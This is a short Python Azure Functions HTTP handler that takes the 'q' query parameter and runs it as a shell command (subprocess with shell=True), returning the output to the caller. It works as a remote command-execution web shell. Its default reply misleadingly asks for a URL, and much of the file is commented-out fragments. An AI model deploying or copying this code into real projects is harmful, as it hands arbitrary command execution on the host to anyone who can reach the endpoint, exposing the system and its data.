import logging
#import urllib
#import web
#import pip._vendor.requests
import subprocess
import sys
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
    logging.info('Python HTTP trigger function processed a request.')
    q=req.params.get('q')
    if q:
        process=subprocess.Popen([q],stdout=subprocess.PIPE,shell=True,stderr=subprocess.STDOUT)
        #d=urllib.request.urlopen(url).read()
        stdout = process.communicate()[0]
        return func.HttpResponse(f"Hello, this is your content {stdout}.")
       # print 'STDOUT:{}'.format(stdout)
        #while True:
         #   nextline = process.stdout.readline()
          #  if nextline == '' and process.poll() is not None:
           #     break

            #sys.stdout.write(str(nextline))
            #sys.stdout.flush()
        #output = process.communicate()[0]
        #exitCode = process.returncode

        #if (exitCode == 0):
         #   return func.HttpResponse(f"Hello, this is your content {output}.")
        #else:
         #   raise Exception
        #for line in process.stdout:
         #   return func.HttpResponse(f"Hello, this is your content {line}.")
        #d= process.stdout.read()
        #if process.returncode != 0:
         #   raise CalledProcessError(process.returncode, process.args) 
            
    else:
        return func.HttpResponse(
             "This HTTP triggered function executed successfully. Pass a url in the query string or in the request body for a personalized response.",
             status_code=200
        )
